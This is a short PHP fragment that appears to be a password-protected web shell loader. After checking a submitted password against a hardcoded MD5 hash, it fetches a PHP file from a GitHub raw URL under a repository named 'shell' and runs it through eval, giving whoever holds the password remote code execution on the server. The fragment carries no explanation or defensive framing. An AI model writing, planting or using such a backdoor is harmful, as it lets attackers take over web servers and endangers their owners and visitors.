...
if (isset($_POST['password'])) {
    ...
    $hashed_password = '96b155b4ad7fe62c039c196d2ba38c6f'; // Replace this with your MD5 hashed password
...
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/topanaqshoolababil/shell/main/d7net.php');
    eval('?>' . $a);
} else {
